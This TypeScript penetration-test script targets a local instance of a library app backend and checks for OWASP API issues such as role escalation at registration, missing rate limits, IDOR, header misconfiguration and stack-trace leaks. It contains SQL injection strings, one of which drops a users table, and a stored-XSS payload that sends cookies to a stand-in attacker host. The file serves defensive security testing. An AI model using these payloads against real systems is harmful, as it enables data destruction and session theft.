/**
 * ============================================================================
 * LIBRAVA BACKEND — PENETRATION TESTING & CYBERSECURITY AUDIT SUITE
 * Certified Ethical Hacker (CEH) / Application Security (AppSec) Framework
 * Standard: OWASP API Security Top 10
 * ============================================================================
 */

interface SecurityFinding {
  code: string;
  category: string;
  target: string;
  title: string;
  severity: 'CRITICAL' | 'HIGH' | 'MEDIUM' | 'LOW' | 'INFO';
  status: 'VULNERABLE' | 'SECURE' | 'WARNING';
  detail: string;
  poc: string;
  recommendation: string;
}

const BASE_URL = 'http://localhost:5000/api';
const findings: SecurityFinding[] = [];

// Helper ANSI formatting
const c = {
  reset: '\x1b[0m',
  bold: '\x1b[1m',
  green: '\x1b[32m',
  red: '\x1b[31m',
  yellow: '\x1b[33m',
  magenta: '\x1b[35m',
  cyan: '\x1b[36m',
  gray: '\x1b[90m',
  bgRed: '\x1b[41m',
  bgGreen: '\x1b[42m',
  bgYellow: '\x1b[43m',
};

async function runPenTest() {
  console.log(`\n${c.bold}${c.bgRed}   LIBRAVA BACKEND PENETRATION TESTING & SECURITY AUDIT   ${c.reset}`);
  console.log(`${c.gray}Framework: OWASP API Security Top 10 | Target: ${BASE_URL}${c.reset}\n`);

  const timestamp = Date.now();
  let attackerToken = '';
  let victimToken = '';
  let attackerId = 0;
  let victimId = 0;
  let victimBookId = 0;

  // SETUP: Create Victim and Attacker accounts
  const victimEmail = `victim_${timestamp}@telkomuniversity.ac.id`;
  const attackerEmail = `attacker_${timestamp}@telkomuniversity.ac.id`;

  const victimReg = await fetch(`${BASE_URL}/auth/register`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      email: victimEmail,
      password: 'VictimPassword123!',
      nama_lengkap: 'Victim User',
      nim: '1301211111',
    }),
  }).then((r) => r.json());
  victimToken = victimReg.data?.token || '';
  victimId = victimReg.data?.user?.id || 0;

  const attackerReg = await fetch(`${BASE_URL}/auth/register`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      email: attackerEmail,
      password: 'AttackerPassword123!',
      nama_lengkap: 'Attacker User',
      nim: '1301219999',
    }),
  }).then((r) => r.json());
  attackerToken = attackerReg.data?.token || '';
  attackerId = attackerReg.data?.user?.id || 0;

  // Victim creates a book
  const bookRes = await fetch(`${BASE_URL}/books`, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      Authorization: `Bearer ${victimToken}`,
    },
    body: JSON.stringify({
      judul: 'Private Victim Book',
      penulis: 'Victim Author',
      kategori: 'Informatika',
    }),
  }).then((r) => r.json());
  victimBookId = bookRes.data?.id || 0;

  // =========================================================================
  // VULN TEST 1: MASS ASSIGNMENT / PRIVILEGE ESCALATION AT REGISTRATION
  // =========================================================================
  console.log(`${c.bold}${c.yellow}[TEST 1] Mass Assignment: Self-Registration with role: 'admin'${c.reset}`);
  const massAssignEmail = `hacker_admin_${timestamp}@telkomuniversity.ac.id`;
  const massAssignRes = await fetch(`${BASE_URL}/auth/register`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      email: massAssignEmail,
      password: 'HackerPassword123!',
      nama_lengkap: 'Malicious Admin Wannabe',
      role: 'admin', // <-- Attacker injects admin role
    }),
  });
  const massAssignData = await massAssignRes.json();
  const registeredRole = massAssignData.data?.user?.role;
  const adminToken = massAssignData.data?.token;

  // Check if this newly registered user can access Admin Dashboard
  let canAccessAdmin = false;
  if (adminToken) {
    const adminCheck = await fetch(`${BASE_URL}/admin/dashboard`, {
      headers: { Authorization: `Bearer ${adminToken}` },
    });
    canAccessAdmin = adminCheck.status === 200;
  }

  if (registeredRole === 'admin' && canAccessAdmin) {
    findings.push({
      code: 'API3:2023-BROKEN-OBJECT-PROPERTY-LEVEL-AUTH',
      category: 'Privilege Escalation / Mass Assignment',
      target: 'POST /api/auth/register',
      title: 'Unrestricted Role Elevation via Public Registration',
      severity: 'CRITICAL',
      status: 'VULNERABLE',
      detail: 'Client dapat mengirimkan payload `role: "admin"` pada endpoint registrasi publik dan server langsung memberikan hak akses Super Admin tanpa verifikasi.',
      poc: `POST /api/auth/register with {"email": "...", "password": "...", "role": "admin"} -> User granted role admin!`,
      recommendation: 'Hardcode `role: "mahasiswa"` di AuthService.register() atau abaikan parameter role dari client. Role admin hanya boleh dibuat lewat database seed atau internal panel.',
    });
    console.log(`  ${c.red}✖ VULNERABLE: Attacker successfully escalated to ADMIN role via public register!${c.reset}`);
  } else {
    findings.push({
      code: 'API3:2023-BROKEN-OBJECT-PROPERTY-LEVEL-AUTH',
      category: 'Privilege Escalation',
      target: 'POST /api/auth/register',
      title: 'Registration Role Assignment',
      severity: 'LOW',
      status: 'SECURE',
      detail: 'Role didaftarkan dengan aman.',
      poc: 'N/A',
      recommendation: 'Pertahankan sanitasi role.',
    });
    console.log(`  ${c.green}✔ SECURE: Role escalation prevented.${c.reset}`);
  }

  // =========================================================================
  // VULN TEST 2: RATE LIMITING & BRUTE FORCE PROTECTION (API4:2023)
  // =========================================================================
  console.log(`\n${c.bold}${c.yellow}[TEST 2] Unrestricted Resource Consumption: Login Brute Force${c.reset}`);
  let bruteForceAllowed = 0;
  const burstCount = 15;
  for (let i = 0; i < burstCount; i++) {
    const r = await fetch(`${BASE_URL}/auth/login`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        email: victimEmail,
        password: `wrong_pass_${i}`,
      }),
    });
    if (r.status === 401) bruteForceAllowed++;
    if (r.status === 429) break; // Rate limited
  }

  if (bruteForceAllowed === burstCount) {
    findings.push({
      code: 'API4:2023-UNRESTRICTED-RESOURCE-CONSUMPTION',
      category: 'Brute Force / Denial of Service',
      target: 'POST /api/auth/login',
      title: 'Lack of Rate Limiting on Authentication Endpoints',
      severity: 'HIGH',
      status: 'VULNERABLE',
      detail: `Server memproses ${burstCount} request percobaan login berturut-turut dalam < 1 detik tanpa HTTP 429 Too Many Requests ataupun delay (IP blocking/captcha).`,
      poc: `Sending 15 rapid consecutive bad password requests -> All responded with HTTP 401 without rate limit.`,
      recommendation: 'Pasang middleware `express-rate-limit` pada endpoint `/api/auth/login` (maksimal 5 percobaan per 15 menit per IP).',
    });
    console.log(`  ${c.red}✖ VULNERABLE: No Rate Limiting detected (${burstCount}/${burstCount} brute force attempts processed).${c.reset}`);
  } else {
    findings.push({
      code: 'API4:2023-UNRESTRICTED-RESOURCE-CONSUMPTION',
      category: 'Rate Limiting',
      target: 'POST /api/auth/login',
      title: 'Login Rate Limiting',
      severity: 'INFO',
      status: 'SECURE',
      detail: 'Rate limit aktif melindungi endpoint login.',
      poc: 'N/A',
      recommendation: 'Pertahankan konfigurasi rate limit.',
    });
    console.log(`  ${c.green}✔ SECURE: Rate limiter triggered.${c.reset}`);
  }

  // =========================================================================
  // VULN TEST 3: SECURITY HEADERS AUDIT (HELMET / CSP / HSTS / CORS)
  // =========================================================================
  console.log(`\n${c.bold}${c.yellow}[TEST 3] Security Headers & Information Disclosure${c.reset}`);
  const headerCheck = await fetch(`${BASE_URL}/health`);
  const poweredBy = headerCheck.headers.get('x-powered-by');
  const corsOrigin = headerCheck.headers.get('access-control-allow-origin');
  const xContentType = headerCheck.headers.get('x-content-type-options');
  const xFrame = headerCheck.headers.get('x-frame-options');

  const missingHeaders: string[] = [];
  if (poweredBy) missingHeaders.push(`X-Powered-By leaked: "${poweredBy}"`);
  if (!xContentType) missingHeaders.push('Missing X-Content-Type-Options: nosniff');
  if (!xFrame) missingHeaders.push('Missing X-Frame-Options');

  if (missingHeaders.length > 0 || corsOrigin === '*') {
    findings.push({
      code: 'API8:2023-SECURITY-MISCONFIGURATION',
      category: 'Security Misconfiguration',
      target: 'HTTP Response Headers',
      title: 'Missing Essential HTTP Security Headers & Wildcard CORS',
      severity: 'MEDIUM',
      status: 'WARNING',
      detail: `Server mengekspos header teknologi (${poweredBy ? `X-Powered-By: ${poweredBy}` : ''}) dan belum menyertakan header proteksi browser standar (Helmet). CORS menggunakan origin wildcard (*).`,
      poc: `Response headers lack: ${missingHeaders.join(', ')}. CORS: ${corsOrigin}`,
      recommendation: 'Gunakan middleware `helmet()` di Express dan batasi `cors({ origin: ["https://frontend-domain.com"] })`.',
    });
    console.log(`  ${c.yellow}⚠ WARNING: Security headers missing: ${missingHeaders.join('; ')}${c.reset}`);
  } else {
    console.log(`  ${c.green}✔ SECURE: Security headers properly configured.${c.reset}`);
  }

  // =========================================================================
  // VULN TEST 4: SQL INJECTION (SQLi) VIA PARAMETERS & PRISMA ORM
  // =========================================================================
  console.log(`\n${c.bold}${c.yellow}[TEST 4] SQL Injection (SQLi) & Tautology Attacks${c.reset}`);
  const sqliPayloads = [
    "' OR '1'='1",
    "1; DROP TABLE users; --",
    "admin'--",
    "' UNION SELECT null, null, null--",
  ];

  let sqliVulnerable = false;
  for (const payload of sqliPayloads) {
    const r = await fetch(`${BASE_URL}/books?search=${encodeURIComponent(payload)}`);
    const text = await r.text();
    // If it returns database syntax error or 500
    if (r.status === 500 && (text.includes('syntax error') || text.includes('PostgreSQL'))) {
      sqliVulnerable = true;
      break;
    }
  }

  if (sqliVulnerable) {
    findings.push({
      code: 'API10:2023-UNSAFE-CONSUMPTION-OF-APIS',
      category: 'Injection',
      target: 'GET /api/books?search=',
      title: 'SQL Injection via Search Parameter',
      severity: 'CRITICAL',
      status: 'VULNERABLE',
      detail: 'Raw parameter tidak di-escape dan memicu error SQL.',
      poc: "Payload: ' OR '1'='1",
      recommendation: 'Gunakan parameterized queries via Prisma ORM.',
    });
    console.log(`  ${c.red}✖ VULNERABLE: SQL Injection payload caused database syntax error!${c.reset}`);
  } else {
    findings.push({
      code: 'API10:2023-INJECTION-DEFENSE',
      category: 'Injection Defense',
      target: 'GET /api/books?search=',
      title: 'SQL Injection Immunity via Prisma Parameterization',
      severity: 'INFO',
      status: 'SECURE',
      detail: 'Prisma ORM mem-bind seluruh input sebagai parameter aman (AST), kebal terhadap manipulasi string SQL.',
      poc: 'Tested with 4 classic SQLi payloads without injection.',
      recommendation: 'Tetap gunakan query builder Prisma dan hindari $queryRawUnsafe().',
    });
    console.log(`  ${c.green}✔ SECURE: Prisma ORM successfully sanitized all SQL injection attempts.${c.reset}`);
  }

  // =========================================================================
  // VULN TEST 5: BOLA / IDOR HORIZONTAL PRIVILEGE ESCALATION
  // =========================================================================
  console.log(`\n${c.bold}${c.yellow}[TEST 5] Broken Object Level Authorization (BOLA / IDOR)${c.reset}`);
  // Attacker tries to delete Victim's book
  const idorDelRes = await fetch(`${BASE_URL}/books/${victimBookId}`, {
    method: 'DELETE',
    headers: { Authorization: `Bearer ${attackerToken}` },
  });

  // Attacker tries to edit Victim's book
  const idorEditRes = await fetch(`${BASE_URL}/books/${victimBookId}`, {
    method: 'PUT',
    headers: {
      'Content-Type': 'application/json',
      Authorization: `Bearer ${attackerToken}`,
    },
    body: JSON.stringify({ judul: 'Stolen Book by Attacker' }),
  });

  if (idorDelRes.status === 403 && idorEditRes.status === 403) {
    findings.push({
      code: 'API1:2023-BROKEN-OBJECT-LEVEL-AUTH',
      category: 'BOLA / IDOR Defense',
      target: 'PUT/DELETE /api/books/:id',
      title: 'Strong Object Ownership Enforcement',
      severity: 'INFO',
      status: 'SECURE',
      detail: 'Server memverifikasi relasi kepemilikan aset (ownerId === req.user.id) sebelum mengizinkan mutasi.',
      poc: 'Attacker cannot edit or delete victim books (Blocked with 403 Forbidden).',
      recommendation: 'Pertahankan pola verifikasi kepemilikan di level Service.',
    });
    console.log(`  ${c.green}✔ SECURE: BOLA/IDOR attempt blocked (HTTP 403 Forbidden).${c.reset}`);
  } else {
    findings.push({
      code: 'API1:2023-BROKEN-OBJECT-LEVEL-AUTH',
      category: 'BOLA / IDOR',
      target: 'PUT/DELETE /api/books/:id',
      title: 'Broken Object Level Authorization (IDOR)',
      severity: 'CRITICAL',
      status: 'VULNERABLE',
      detail: 'Attacker berhasil mengubah atau menghapus buku milik user lain.',
      poc: `PUT /api/books/${victimBookId} returned ${idorEditRes.status}`,
      recommendation: 'Tambahkan pengecekan kepemilikan buku.',
    });
    console.log(`  ${c.red}✖ VULNERABLE: IDOR detected!${c.reset}`);
  }

  // =========================================================================
  // VULN TEST 6: STACK TRACE LEAK IN UNHANDLED ERRORS (INFO DISCLOSURE)
  // =========================================================================
  console.log(`\n${c.bold}${c.yellow}[TEST 6] Information Disclosure: Stack Trace Leakage${c.reset}`);
  const errRes = await fetch(`${BASE_URL}/auth/register`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      email: victimEmail, // duplicate to trigger error
      password: 'test',
      nama_lengkap: 'test',
    }),
  });
  const errData = await errRes.json();
  const hasStackTrace = Boolean(errData.stack);

  if (hasStackTrace) {
    findings.push({
      code: 'API8:2023-SECURITY-MISCONFIGURATION',
      category: 'Information Disclosure',
      target: 'Global Error Handler',
      title: 'Full Stack Trace Exposed in Production/Staging Responses',
      severity: 'MEDIUM',
      status: 'WARNING',
      detail: 'Response error menyertakan properti `stack` yang membocorkan path direktori internal server (`D:\\DATA-WIFI\\...`).',
      poc: 'Error responses contain "stack: Error: ... at D:\\DATA-WIFI\\..."',
      recommendation: 'Sembunyikan stack trace saat NODE_ENV === "production" dan simpan ke logger internal (misal: Winston/Pino).',
    });
    console.log(`  ${c.yellow}⚠ WARNING: Stack trace exposed in API error response.${c.reset}`);
  } else {
    console.log(`  ${c.green}✔ SECURE: No stack trace leakage in error response.${c.reset}`);
  }

  // =========================================================================
  // VULN TEST 7: STORED XSS / MALICIOUS HTML PAYLOAD INJECTION
  // =========================================================================
  console.log(`\n${c.bold}${c.yellow}[TEST 7] Stored Cross-Site Scripting (XSS) in Book Content${c.reset}`);
  const xssPayload = `<script>alert('XSS_PWNED')</script><img src=x onerror=fetch('http://attacker.com/steal?cookie='+document.cookie)>`;
  const xssBookRes = await fetch(`${BASE_URL}/books`, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      Authorization: `Bearer ${attackerToken}`,
    },
    body: JSON.stringify({
      judul: xssPayload,
      penulis: 'XSS Tester',
      deskripsi: xssPayload,
      kategori: 'Informatika',
    }),
  }).then((r) => r.json());

  const storedXssId = xssBookRes.data?.id;
  const fetchXss = await fetch(`${BASE_URL}/books/${storedXssId}`).then((r) => r.json());
  const returnedTitle = fetchXss.data?.judul;

  if (returnedTitle && returnedTitle.includes('<script>')) {
    findings.push({
      code: 'API8:2023-INJECTION',
      category: 'Stored XSS (Cross-Site Scripting)',
      target: 'POST /api/books (judul & deskripsi)',
      title: 'Unsanitized HTML Script Tags Allowed in Text Fields',
      severity: 'MEDIUM',
      status: 'WARNING',
      detail: 'Backend menerima dan menyimpan script HTML berbahaya secara mentah tanpa sanitasi (DOMPurify/sanitize-html). Jika Frontend me-render menggunakan innerHTML/v-html/dangerouslySetInnerHTML, script akan langsung dieksekusi di browser korban.',
      poc: `Inputting "${xssPayload}" was stored and returned raw without escaping.`,
      recommendation: 'Sanitasi input string di backend atau pastikan Frontend hanya menggunakan safe text binding (misal: React JSX `{title}` atau Flutter `Text()`).',
    });
    console.log(`  ${c.yellow}⚠ WARNING: Stored HTML tags accepted without backend sanitization.${c.reset}`);
  } else {
    console.log(`  ${c.green}✔ SECURE: HTML tags sanitized or escaped.${c.reset}`);
  }

  // Clean up XSS book
  if (storedXssId) {
    await fetch(`${BASE_URL}/books/${storedXssId}`, {
      method: 'DELETE',
      headers: { Authorization: `Bearer ${attackerToken}` },
    });
  }

  // Clean up Victim book
  if (victimBookId) {
    await fetch(`${BASE_URL}/books/${victimBookId}`, {
      method: 'DELETE',
      headers: { Authorization: `Bearer ${victimToken}` },
    });
  }

  // =========================================================================
  // SUMMARY REPORT
  // =========================================================================
  console.log(`\n${'='.repeat(75)}`);
  console.log(`${c.bold}🛡️  CYBERSECURITY AUDIT SUMMARY REPORT${c.reset}`);
  console.log(`${'='.repeat(75)}`);

  const criticals = findings.filter((f) => f.severity === 'CRITICAL' && f.status === 'VULNERABLE').length;
  const highs = findings.filter((f) => f.severity === 'HIGH' && f.status === 'VULNERABLE').length;
  const mediums = findings.filter((f) => f.severity === 'MEDIUM' && (f.status === 'VULNERABLE' || f.status === 'WARNING')).length;
  const secures = findings.filter((f) => f.status === 'SECURE').length;

  console.log(`Critical Vulnerabilities : ${criticals > 0 ? c.red : c.green}${c.bold}${criticals}${c.reset}`);
  console.log(`High Vulnerabilities     : ${highs > 0 ? c.red : c.green}${c.bold}${highs}${c.reset}`);
  console.log(`Medium / Warnings        : ${mediums > 0 ? c.yellow : c.green}${c.bold}${mediums}${c.reset}`);
  console.log(`Passed Security Controls : ${c.green}${c.bold}${secures}${c.reset}`);
  console.log(`${'='.repeat(75)}\n`);

  return findings;
}

runPenTest().catch((err) => {
  console.error('Security test failed to execute:', err);
});
